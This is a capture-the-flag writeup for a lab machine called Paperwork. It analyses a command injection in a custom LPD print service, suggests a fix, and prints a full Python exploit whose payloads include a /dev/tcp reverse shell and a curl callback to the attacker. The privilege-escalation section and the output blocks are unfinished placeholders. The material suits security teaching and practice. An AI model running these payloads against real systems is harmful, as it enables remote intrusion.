+++
title = "PaperWork"
tags = ["writeup"]
date = 2026-11-04
authors = ["Aniko"]
+++

# PAPERWORK Writeup

**Machine:** Paperwork  
**OS:** Linux  
**Difficulty:** Easy

## Summary

Paperwork is a Linux machine that runs an intranet web page on port 80 and a custom Line Printer Daemon (LPD) service on port 1515. The LPD service puts a user-controlled job name into a shell command, which lets us execute commands on the server.

## Table of Contents
- [Initial Foothold](#initial-foothold)
  - [Recon](#recon)
    - [Port Scan](#port-scan)
    - [Web Application](#web-application)
  - [Analysis](#analysis)
    - [Server Code Correction](#server-code-correction)
    - [Server Code Analysis](#server-code-analysis)
    - [Remediation](#remediation)
  - [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
  - [Recon](#recon-1)
  - [Analysis](#analysis-1)
  - [Exploitation](#exploitation-1)
- [Conclusion](#conclusion)

## Initial Foothold

### Recon

#### Port Scan

We start with an Nmap scan. The flags `-sC` run the default scripts, `-sV` detects service versions, and `-O` attempts OS detection.

```sh
$ cat scan.txt
# Nmap 7.92 scan initiated Sun Nov  1 21:33:17 2026 as: nmap -sC -sV -O -oN scan.txt 10.129.191.193
Nmap scan report for paperwork.htb (10.129.191.193)
Host is up (0.048s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.28.0 (Ubuntu)
|_http-title: Intranet | Document Archiving Service
|_http-server-header: nginx/1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
| fingerprint-strings:
|   TerminalServer, TerminalServerCookie:
|_    Archive_Printer is ready and printing.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/1%OT=22%CT=1%CU=36043%PV=Y%DS=2%DC=I%G=Y%TM=6AE7A22
OS:2%P=x86_64-redhat-linux-gnu)SEQ(SP=FE%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=FE%GCD=1%ISR=103%TI=Z%CI=Z%TS=A)OPS(O1=M552ST11NW9%O2=M552ST11NW9
OS:%O3=M552NNT11NW9%O4=M552ST11NW9%O5=M552ST11NW9%O6=M552ST11)WIN(W1=FE88%W
OS:2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NN
OS:SNW9%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov  1 21:33:38 2026 -- 1 IP address (1 host up) scanned in 21.02 seconds
```

The host exposes a web server on port 80 and an unknown service on port 1515. Nmap could not identify the service on 1515, but its banner says *"Archive_Printer is ready and printing."* The default LPD port from RFC 1179 is 515, so port 1515 is probably a custom LPD implementation. We will look at it more closely later.

Before we browse the site, we add the hostname to our hosts file:

```sh
$ echo "10.129.191.193 paperwork.htb" | sudo tee -a /etc/hosts
```

#### Web Application

![Paperwork intranet homepage](/images/PaperWorkWP.png)

The web application shows a *System Configuration* panel with the protocol, the target queue, and the internal processor. The target queue is set to `archive_intake`, which will matter later.

The internal processor is shipped as a zip archive that we can download:

```sh
$ wget http://paperwork.htb/download/archive
$ unzip paperwork-archive-v1.02.zip
Archive:  paperwork-archive-v1.02.zip
  inflating: server.py
```

### Analysis

#### Server Code Correction

The archive contains a single file, `server.py`. When we try to run it locally, it fails with an indentation error:

```sh
$ python server.py
  File "server.py", line 47
    parts = chunk[1:].decode(errors='ignore').split()
IndentationError: unexpected indent
```

The error is in the `handle_print_job` function. Lines 47 to 71 are indented one tab too far, so we remove one tab from each of those lines. This is the corrected function:

```python
    def handle_print_job(self, data):
        queue = data[1:].decode().strip()

        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01')
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break

            subcommand = chunk[0]
            self.sock.send(b'\x00')
            parts = chunk[1:].decode(errors='ignore').split()
            if not parts: continue

            size = int(parts[0])
            content = b""
            while len(content) < size:
                content += self.sock.recv(size - len(content) + 1)

            decoded_content = content.decode(errors='ignore')

            job_name = "Unknown"
            for line in decoded_content.split('\n'):
                line = line.strip()
                if line.startswith('J'):
                    job_name = line[1:]
                    break

            print(f"{self.id} Executing archive for: {job_name}")
            subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)

            self.sock.send(b'\x00')
            self.sock.send(b'\x00')
            while self.sock.recv(4096):
                pass
            break
```

Running it again gives us a new error. The `os` module is used on line 6 but never imported:

```sh
$ python server.py
Traceback (most recent call last):
  File "server.py", line 6, in <module>
    VALID_QUEUE = os.environ.get("LPD_QUEUE")
                  ^^
NameError: name 'os' is not defined. Did you forget to import 'os'?
```

We add the missing import at the top of the file:

```python
import socket
import threading
import subprocess
import os
```

Now the server starts:

```sh
$ python server.py
[*] LPD Server listening on 1515
```

With the server running, we can analyze the code.

#### Server Code Analysis

The Python application is a [*Line Printer Daemon*](https://www.rfc-editor.org/info/rfc1179) that listens on port 1515. It follows the general structure of RFC 1179, but several parts of the implementation do not match the protocol, so it cannot process a standard print job without a custom client.

On line 6, the server reads the queue name from an environment variable:

```python
VALID_QUEUE = os.environ.get("LPD_QUEUE")
```

The web application's *System Configuration* page sets the target queue to `archive_intake`, so we can assume `LPD_QUEUE` is set to `archive_intake` on the server.

The queue check in `handle_print_job` has a weakness of its own. `VALID_QUEUE` is a string, so `queue not in VALID_QUEUE` performs a substring match, not an exact match. Any substring of `archive_intake` (for example `archive` or `intake`) would be accepted. If `LPD_QUEUE` is not set, `VALID_QUEUE` is `None`, and the `in` check raises a `TypeError`.

The main issue is an **OS command injection** in `handle_print_job`. The server reads the job name from the control file, which is a line that starts with `J`. It then puts that value directly into a shell command:

```python
job_name = line[1:]
...
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

The job name is wrapped in single quotes and passed to a shell with `shell=True`. Because the input is not sanitized, we can close the quote, add our own command, and comment out the rest of the line. If the job name is:

```
'; id ; #
```

the shell receives this command:

```sh
echo 'Archive: '; id ; #' >> /tmp/archive.log
```

The first `'` closes the string, `;` starts a new command, `id` runs, and `#` turns the rest of the line into a comment, so the trailing `' >> /tmp/archive.log` is ignored.

#### Remediation

The fix is to avoid the shell completely. Use an argument list with `shell=False` and write the log entry with Python's file I/O:

```python
with open("/tmp/archive.log", "a") as log:
    log.write(f"Archive: {job_name}\n")
```

If a shell command is required, pass the arguments as a list and do not use `shell=True`. The queue check should also use an exact match against a set, such as `if queue != VALID_QUEUE:`, and the job name should be validated against a strict pattern before it is used.

### Exploitation

The exploit sends a job over the same protocol flow that the server expects:

1. It sends command `02` with the queue name, which starts a job.
2. It sends sub-command `02` with the control file size and name.
3. It sends the control file. One line in the file is the `J` line, which contains our injection.
4. It sends a zero byte to end the control file.

The exploit uses a delay ladder between packets. On some runs the queue packet and the sub-command packet are merged by the kernel, and the server rejects the job. The server does this before it calls `subprocess.Popen`, so a retry does not run the payload twice.

The script has four payload modes:

- `shell` opens a reverse shell over `/dev/tcp`.
- `verify` sends an HTTP request back to us, which confirms execution.
- `file` writes the output of `id` to `/tmp/pwned`.
- `sleep` delays the response by 8 seconds, which confirms a blind injection.

Before we run the exploit, we start a listener on our machine. The `--lhost` value must be our VPN (tun0) address, not `127.0.0.1`:

```sh
$ nc -lvnp 4444
```

Then we run the exploit in a second terminal:

```sh
$ python3 archive_ghost.py 10.129.191.193 -m shell --lhost <tun0_ip> --lport 4444
```

```
[TODO: paste the real output here]
```

Once the shell connects, we confirm our access:

```sh
[TODO: paste the id/whoami output here. Do not include the user flag.]
```

Full exploit script:

```python
#!/usr/bin/env python3
"""
LPD Archive RCE — "ARCHIVE_GHOST" (RFC 1179 edition)
====================================================
Exploits a command injection in the LPD print-job handler
(archive_intake queue) to achieve remote code execution.

Protocol: RFC 1179 — Line Printer Daemon Protocol
          https://www.rfc-editor.org/rfc/rfc1179

Style: NSA/TAO clinical terminal aesthetic.
Color: stone-color (pip install stone-color)
"""

import argparse
import logging
import random
import socket
import sys
import time
from pathlib import Path

from stone_color.messages import printf

# ----------------------------------------------------------------------
# RFC 1179 constants
# ----------------------------------------------------------------------
DEFAULT_QUEUE = "archive_intake"
DEFAULT_PORT  = 1515          # RFC says 515; HTB target uses 1515
MAX_RETRIES   = 10
ACK_ACCEPT    = b"\x00"       # positive acknowledgement (RFC 1179 §3.1)
ACK_REJECT    = b"\x01"       # negative acknowledgement (any non-zero)

# Daemon command codes (RFC 1179 §5)
CMD_RECEIVE_JOB    = 2        # 02 – Receive a printer job
# Sub-command codes (RFC 1179 §6)
SUBCMD_ABORT       = 1        # 01 – Abort job
SUBCMD_CONTROL     = 2        # 02 – Receive control file
SUBCMD_DATA        = 3        # 03 – Receive data file

# Inter-packet delay ladder: 50 ms is enough on loopback,
# but we back off if the kernel coalesces the queue packet
# with the sub-command packet.
DELAY_LADDER_MS = [50, 100, 200, 300, 500, 750, 1000]

# ----------------------------------------------------------------------
# Logging
# ----------------------------------------------------------------------
LOG = logging.getLogger("archive_ghost")
LOG.setLevel(logging.DEBUG)

_file_handler = logging.FileHandler("archive_ghost.log")
_file_handler.setFormatter(
    logging.Formatter("%(asctime)s | %(levelname)-8s | %(message)s")
)
LOG.addHandler(_file_handler)

# ----------------------------------------------------------------------
# UI helpers (NSA/TAO aesthetic)
# ----------------------------------------------------------------------
C_BANNER = "{#4ec9b0}"
C_INFO   = "{#569cd6}"
C_OK     = "{#6a9955}"
C_WARN   = "{#dcdcaa}"
C_ERR    = "{#f44747}"
C_DIM    = "{#808080}"
C_RESET  = "{#reset}"

BANNER = r"""
,----,------------------------------,------.
| ## |                              |    - |
| ## |                              |    - |
|    |------------------------------|    - |
|    ||............................||      |
|    ||,-                        -.||      |
|    ||___                      ___||    ##|
|    ||---`--------------------'---||      |
`--mb'|_|______________________==__|`------'
"""


def banner():
    printf(BANNER, color=True)
    printf(
        f"{C_DIM}  queue: archive_intake  |  injection: shell=True  |  "
        f"mode: blind RCE  |  proto: RFC 1179{C_RESET}\n"
    )


def info(msg):
    printf(f"{C_INFO}[*]{C_RESET} {msg}")


def ok(msg):
    printf(f"{C_OK}[+]{C_RESET} {msg}")


def warn(msg):
    printf(f"{C_WARN}[!]{C_RESET} {msg}")


def err(msg):
    printf(f"{C_ERR}[-]{C_RESET} {msg}")


# ----------------------------------------------------------------------
# Payload construction
# ----------------------------------------------------------------------
def build_payload(mode: str, lhost: str, lport: int) -> str:
    """
    Return the *injection string* that will be placed after the 'J'
    in the control file.  The control file builder adds the 'J' prefix.
    """
    if mode == "shell":
        # /bin/sh (dash) lacks /dev/tcp — invoke bash explicitly.
        cmd = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    elif mode == "verify":
        cmd = f"curl -s http://{lhost}:{lport}/pwned"
    elif mode == "file":
        cmd = "id > /tmp/pwned"
    elif mode == "sleep":
        cmd = "sleep 8"
    else:
        raise ValueError(f"unknown mode: {mode}")

    # Break out of the single-quoted string in the vulnerable
    # echo 'Archive: {job_name}' >> /tmp/archive.log
    return f"'; {cmd} ; #"


# ----------------------------------------------------------------------
# RFC 1179 control-file builder
# ----------------------------------------------------------------------
def build_control_file(injection: str, hostname: str) -> bytes:
    """
    Build a minimal, RFC 1179 §7-compliant control file.

    Required lines:
      H<host>   – responsible host   (§7.2)
      P<user>   – responsible user   (§7.8)
    The injection goes into the optional J line (§7.4):
      J'; <cmd> ; #
    """
    # RFC 1179 §7: no leading whitespace after the command character.
    # We do not need a data-file ('f', 'l', 'p', etc.) because the
    # vulnerability is triggered when the daemon parses the J line.
    return (
        f"H{hostname}\n"
        f"Poperator\n"
        f"J{injection}\n"
    ).encode()


# ----------------------------------------------------------------------
# RFC 1179 exploit primitive
# ----------------------------------------------------------------------
def deliver(
    host: str,
    port: int,
    queue: str,
    injection: str,
    inter_packet_delay: float,
    timeout: float = 5.0,
) -> str:
    """
    Send an RFC 1179 print job.

    Returns one of:
      "ok"        – queue accepted, control file parsed, J line executed
      "coalesced" – queue packet merged with sub-command; no execution
      "error"     – unexpected ack or I/O failure
    """
    # --- Build a compliant control file --------------------------------
    job_number = f"{random.randint(0, 999):03d}"
    hostname   = socket.gethostname()
    control_name = f"cfA{job_number}{hostname}"          # §6.2
    control_body = build_control_file(injection, hostname)
    control_size = len(control_body)

    LOG.debug("Control file name: %s", control_name)
    LOG.debug("Control file body:\n%s", control_body.decode(errors="replace"))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    try:
        s.connect((host, port))
        info(f"TCP connection established to {host}:{port}")

        # --- Step 1: command 02 – Receive a printer job ---------------
        # RFC 1179 §5.2: [02] [Queue] [LF]
        s.sendall(bytes([CMD_RECEIVE_JOB]) + queue.encode() + b"\n")

        # RFC 1179 says the client MUST read an ack here, but the
        # target daemon never sends one.  Reading would block forever,
        # so we skip it and use the sub-command ack as our sync point.
        # -----------------------------------------------------------------
        if inter_packet_delay > 0:
            time.sleep(inter_packet_delay)

        # --- Step 2: sub-command 02 – Receive control file ------------
        # RFC 1179 §6.2: [02] [Count] SP [Name] LF
        subcmd = (
            bytes([SUBCMD_CONTROL])
            + f"{control_size} {control_name}\n".encode()
        )
        s.sendall(subcmd)

        ack1 = s.recv(1)

        if ack1 == ACK_REJECT:
            warn(
                f"queue rejected (inter-packet {inter_packet_delay*1000:.0f}ms "
                f"too short — packets coalesced)"
            )
            LOG.warning(
                "ACK_REJECT from %s:%s (delay=%.0fms)",
                host, port, inter_packet_delay * 1000,
            )
            return "coalesced"

        if ack1 != ACK_ACCEPT:
            err(f"unexpected sub-command ack: {ack1!r}")
            LOG.error("Unexpected ACK %r", ack1)
            return "error"

        info("queue accepted — control-file sub-command acknowledged")

        # --- Step 3: send the control-file body -----------------------
        s.sendall(control_body)

        # --- Step 4: RFC 1179 §6.2 zero-octet terminator ---------------
        s.sendall(b"\x00")

        # The target daemon replies with two NUL bytes after parsing
        # the control file.  We read them as an execution ack.
        try:
            s.recv(2)
        except socket.timeout:
            pass

        LOG.info("Injection delivered via control file J line: %s", injection)
        return "ok"

    except socket.timeout:
        err("socket timeout during handshake")
        LOG.error("Timeout connecting to %s:%s", host, port)
        return "error"
    except ConnectionRefusedError:
        err(f"connection refused by {host}:{port}")
        LOG.error("Connection refused")
        return "error"
    finally:
        s.close()


def exploit(
    host: str,
    port: int,
    queue: str,
    injection: str,
    ladder_ms: list[int] | None = None,
) -> bool:
    """
    Retry loop with an escalating inter-packet delay.

    ACK_REJECT is a clean signal: the server rejected the job *before*
    calling subprocess.Popen, so retrying cannot double-fire the payload.
    """
    ladder = ladder_ms or DELAY_LADDER_MS

    for attempt, delay_ms in enumerate(ladder, 1):
        delay = delay_ms / 1000.0
        printf(
            f"{C_DIM}  └─ attempt {attempt:02d}/{len(ladder)} "
            f"(inter-packet={delay_ms:>4d}ms){C_RESET}"
        )

        result = deliver(host, port, queue, injection, inter_packet_delay=delay)

        if result == "ok":
            return True

        if result == "coalesced" and attempt < len(ladder):
            warn("retrying with longer inter-packet delay (no execution occurred)")

    err(f"payload delivery failed after {len(ladder)} attempts")
    return False


# ----------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="archive_ghost",
        description="LPD archive_intake command-injection exploit (RFC 1179)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
payload modes:
  shell    reverse shell via /dev/tcp (requires bash on target)
  verify   HTTP callback to confirm RCE (start a listener)
  file     write `id` output to /tmp/pwned
  sleep    blind timing test (8s delay)

RFC 1179 notes:
  • Command 02 carries a mandatory LF after the queue name (§5.2).
  • The control file is sent with sub-command 02, not an ad-hoc 0x00.
  • A zero octet terminates the control file (§6.2).
  • The target daemon does not acknowledge the queue name, so the
    sub-command ack is used as the synchronisation primitive.
""",
    )
    p.add_argument("target", help="target IP or hostname")
    p.add_argument(
        "-p", "--port", type=int, default=DEFAULT_PORT,
        help=f"LPD port (default: {DEFAULT_PORT})",
    )
    p.add_argument(
        "-q", "--queue", default=DEFAULT_QUEUE,
        help=f"queue name (default: {DEFAULT_QUEUE})",
    )
    p.add_argument(
        "-m", "--mode",
        choices=("shell", "verify", "file", "sleep"),
        default="verify",
        help="payload mode (default: verify)",
    )
    p.add_argument(
        "--lhost", default="127.0.0.1",
        help="callback / reverse-shell host",
    )
    p.add_argument(
        "--lport", type=int, default=4444,
        help="callback / reverse-shell port",
    )
    p.add_argument(
        "--delay", type=int, default=None, metavar="MS",
        help="fixed inter-packet delay in ms (overrides the ladder)",
    )
    p.add_argument(
        "--no-banner", action="store_true",
        help="suppress the ASCII banner",
    )
    p.add_argument(
        "--debug", action="store_true",
        help="enable verbose debug logging to stderr",
    )
    return p.parse_args()


# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
def main() -> int:
    args = parse_args()

    if args.debug:
        LOG.setLevel(logging.DEBUG)
        sh = logging.StreamHandler(sys.stderr)
        sh.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
        LOG.addHandler(sh)

    if not args.no_banner:
        banner()

    # Summary block
    info(f"target      : {args.target}:{args.port}")
    info(f"queue       : {args.queue}")
    info(f"payload     : {args.mode}")
    info(f"protocol    : RFC 1179 (LPD)")
    if args.mode in ("shell", "verify"):
        info(f"callback    : {args.lhost}:{args.lport}")
    printf("")

    # Build injection string
    injection = build_payload(args.mode, args.lhost, args.lport)
    LOG.debug("Raw injection string: %s", injection)

    # Fire
    ladder = [args.delay] if args.delay is not None else DELAY_LADDER_MS
    if exploit(args.target, args.port, args.queue, injection, ladder_ms=ladder):
        ok("payload executed — target compromised")
        if args.mode == "shell":
            ok(f"check your listener: nc -lvnp {args.lport}")
        elif args.mode == "verify":
            ok(f"check your web server for a hit from {args.target}")
        elif args.mode == "file":
            ok("verify with: cat /tmp/pwned (post-access)")
        elif args.mode == "sleep":
            ok("if the request took ~8s, injection is confirmed")
        printf("")
        printf(f"{C_DIM}  log: {Path('archive_ghost.log').resolve()}{C_RESET}")
        return 0

    err("operation failed — target may be patched or unreachable")
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        printf(f"\n{C_WARN}[!]{C_RESET} interrupted by operator\n")
        sys.exit(130)
```

## Privilege Escalation

### Recon


### Analysis



### Exploitation

## Conclusion
